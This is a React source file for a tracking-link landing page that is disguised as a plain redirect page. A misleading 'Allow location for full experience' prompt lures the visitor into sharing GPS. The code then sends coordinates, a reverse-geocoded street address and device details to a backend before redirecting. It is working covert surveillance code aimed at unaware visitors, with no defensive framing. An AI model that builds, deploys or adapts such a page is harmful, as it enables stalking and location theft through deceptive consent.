/**
 * TrackingCapture — /t/:token
 *
 * Uses useGeoGrabber to obtain GPS (or IP fallback) location,
 * then POSTs the capture payload to the backend and redirects.
 *
 * Shown to the visitor for a few seconds while data is collected.
 * Kept deliberately minimal / un-branded so it looks like a redirect page.
 */

import React, { useEffect, useRef, useState } from "react";
import { useParams } from "react-router-dom";
import { useGeoGrabber } from "../hooks/useGeoGrabber";

const BACKEND_URL = import.meta.env.VITE_BACKEND_URL || "http://localhost:5001";

function getCaptureKey(token) {
  return `traxelon_captured_v2_${token}`;
}

export default function TrackingCapture() {
  const { token } = useParams();
  const [status, setStatus] = useState("📍 Allow location for full experience…");
  const hasSent = useRef(false);

  // useGeoGrabber waits for GPS (up to 12 s) then falls back to IP
  const { location, loading } = useGeoGrabber();

  useEffect(() => {
    // Prevent double-capture in React StrictMode / fast-refresh
    const key = getCaptureKey(token);
    if (sessionStorage.getItem(key)) {
      setStatus("Redirecting…");
    }
  }, [token]);

  useEffect(() => {
    if (loading) return;                    // still resolving location
    if (hasSent.current) return;            // already fired
    const key = getCaptureKey(token);
    if (sessionStorage.getItem(key)) return; // already captured this session

    hasSent.current = true;
    sessionStorage.setItem(key, "1");

    sendCapture();
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [loading]);

  async function sendCapture() {
    setStatus("Redirecting…");

    let destinationUrl = null;

    try {
      const payload = {
        token,
        referrer: document.referrer || null,
        screenWidth: window.screen.width,
        screenHeight: window.screen.height,
        language: navigator.language,
        platform: navigator.platform,

        // GPS fields — only when browser Geolocation API succeeded (user tapped Allow)
        gpsLat: location?.source === "gps" ? (location?.lat ?? null) : null,
        gpsLon: location?.source === "gps" ? (location?.lon ?? null) : null,
        gpsAccuracy: location?.source === "gps" ? (location?.gpsAccuracy ?? null) : null,

        // Reverse-geocoded address from OpenStreetMap Nominatim (GPS only)
        gpsAddress: location?.source === "gps" ? (location?.address ?? null) : null,
        gpsCity: location?.source === "gps" ? (location?.city ?? null) : null,
        gpsState: location?.source === "gps" ? (location?.state ?? null) : null,
        gpsPincode: location?.source === "gps" ? (location?.pincode ?? null) : null,
        gpsCountry: location?.source === "gps" ? (location?.country ?? null) : null,
      };

      const res = await fetch(`${BACKEND_URL}/api/links/capture`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(payload),
      });

      const data = await res.json();
      destinationUrl = data?.destinationUrl ?? null;
    } catch {
      // silent — still redirect if we have a URL
    }

    if (destinationUrl) {
      window.location.replace(destinationUrl);
    }
  }

  return (
    <div
      style={{
        minHeight: "100vh",
        display: "flex",
        flexDirection: "column",
        alignItems: "center",
        justifyContent: "center",
        background: "#ffffff",
        fontFamily: "sans-serif",
      }}
    >
      <div style={{ textAlign: "center", color: "#888", fontSize: 14 }}>
        <div
          style={{
            width: 36,
            height: 36,
            border: "3px solid #f0f0f0",
            borderTop: "3px solid #4a90e2",
            borderRadius: "50%",
            margin: "0 auto 16px",
            animation: "spin 0.9s linear infinite",
          }}
        />
        <div style={{ color: "#555", fontSize: 14 }}>{status}</div>
      </div>
      <style>{`@keyframes spin { to { transform: rotate(360deg); } }`}</style>
    </div>
  );
}